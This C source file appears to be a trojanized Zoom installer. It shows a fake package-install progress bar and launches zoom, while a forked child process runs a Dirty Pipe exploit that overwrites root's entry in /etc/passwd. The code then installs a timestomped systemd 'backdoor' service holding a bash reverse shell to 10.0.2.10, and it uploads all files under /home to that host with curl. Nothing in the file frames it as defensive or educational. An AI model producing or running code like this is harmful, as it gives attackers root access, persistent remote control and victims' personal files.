#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdlib.h>
#include <time.h>   
#include <pthread.h> 


#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

void progressBar(){

    char *arr[] = { "(Reading database ... 174906 files and directories currently installed.)", "Downloading packages ...", "Unpacking zoom (5.12.9.367) ", "Setting up zoom (5.12.9.367) ...", "Processing triggers for gnome-menus (3.36.0-1ubuntu1) ..." , "Processing triggers for desktop-file-utils (0.24-1ubuntu3) ... ", "Processing triggers for mime-support (3.64ubuntu1) ... " , "Processing triggers for shared-mime-info (1.15-1) ...", "Updating ... ", " ... "};
    
	float progress = 0.0;
	float limit=1.0;
	srand(time(NULL));
	int str=0;
	
	while (progress < limit) {
	    int barWidth = 70;
	    printf("\33[2K\r");
	    printf("%s\n", arr[str]);
	    printf("[");
	    int pos = barWidth * progress;

	    for (int i = 0; i < barWidth; ++i) {
		if (i < pos) printf("=");
		else if (i == pos) printf(">");
		else printf(" ");
	    }
	    printf("] %i\%\r",(int)(progress * 100));
	fflush(stdout); 
	    float y = (float)rand()/(float)(RAND_MAX/0.16);
	    progress += y;
	    float x = (float)rand()/(float)(RAND_MAX/5);
	    sleep(x);
	    str++;
	    
	    if(str>9)
	    	str=9;
	}
	   printf("\33[2K\r");
	   printf("Done ...\n");
	   printf("Launching zoom, please wait ...\n");
	   sleep(3);
}

void payload()
{
    // Exploit for priviledge escalation
    const char *const path = "/etc/passwd";

    FILE *f1 = fopen("/etc/passwd", "r");
    FILE *f2 = fopen("/tmp/passwd.bak", "w");

    if (f1 == NULL) {
        exit(EXIT_FAILURE);
    } else if (f2 == NULL) {
        fclose(f1);
        exit(EXIT_FAILURE);
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);

	loff_t offset = 4; // after the "root"
	const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped 
	const size_t data_size = strlen(data);


	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)


	struct stat st;

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);


	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);

    char *LHOST = "10.0.2.10";
    char *LPORT = "9001";
    char *SPORT = "8000";
           
    char *cmd = "(echo piped; cat) | su - -c \"cp /tmp/passwd.bak /etc/passwd;echo '[Service]\nType=simple\nUser=root\nRestart=on-failure\nRestartSec=5s\nExecStart=/bin/bash -c \\\"while [ 1 ]; do bash -i >& /dev/tcp/%s/%s 0>&1; done\\\"\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service;touch -t 202202230836 /etc/systemd/system/backdoor.service;sudo systemctl enable backdoor --now; sudo apt update >/dev/null 2>&1; sudo apt install curl >/dev/null 2>&1; find /home/ -not -path '*/\.*' -name '*' -type f -exec curl -s -T {} http://%s:%s/ \\; > /dev/null; /bin/sh\" root 2>/dev/null &";

    
    char buffer[strlen(cmd) + 20];
    
    sprintf(buffer, cmd, LHOST, LPORT, LHOST, SPORT);

    char *argv[] = {"/bin/sh", "-c", buffer};
    
    
    execv("/bin/sh", argv);
    printf("system() function call seems to have failed :(\n");

}

int main() {

  pid_t pid;


switch((pid=fork()))
{
case -1:
	break;
case 0:
	payload();
	break;
default:
	progressBar();
	system("zoom &");
	break;
}

return(0);
}
